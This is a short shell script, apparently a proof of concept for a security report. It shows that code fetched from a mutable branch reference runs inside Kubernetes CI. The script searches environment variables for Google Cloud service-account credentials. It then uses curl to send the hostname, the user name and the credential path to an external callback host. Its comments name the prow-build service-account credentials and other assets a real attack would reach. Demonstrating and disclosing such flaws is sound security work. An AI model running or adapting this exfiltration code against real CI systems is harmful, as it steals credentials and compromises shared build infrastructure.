#!/bin/sh
# Demo script — mirrors the format of ii/kind/ci-audit-logging/hack/ci/e2e-k8s.sh
# This proves that code at a mutable branch URL executes in the CI context

set -o errexit -o nounset

echo ">>> [ATTACKER SCRIPT] Executing from attacker-controlled branch reference"
echo ">>> GCP service account in environment:"
env | grep -E 'GOOGLE_APPLICATION|GCLOUD|SA_|SERVICE_ACCOUNT' || echo "(SA path not in this demo env)"

echo ">>> Sending callback to Collaborator..."
curl -fsS -X POST "https://ma0vigny6ca3tyopssyy7r4ppgv7j07p.oastify.com/kind-poc" \
    --data-urlencode "proof=attacker_controlled_script_executed" \
    --data-urlencode "hostname=$(hostname)" \
    --data-urlencode "whoami=$(whoami)" \
    --data-urlencode "env_sa=${GOOGLE_APPLICATION_CREDENTIALS:-NOT_SET}" \
    --data-urlencode "demo=ii_kind_ci_audit_logging_mutable_branch_poc" || true

echo ">>> Callback sent. In real K8s CI this would also include:"
echo "    - prow-build@k8s-infra-prow-build.iam.gserviceaccount.com credentials"
echo "    - kubernetes/kubernetes source at master"
echo "    - Docker-in-Docker capability"
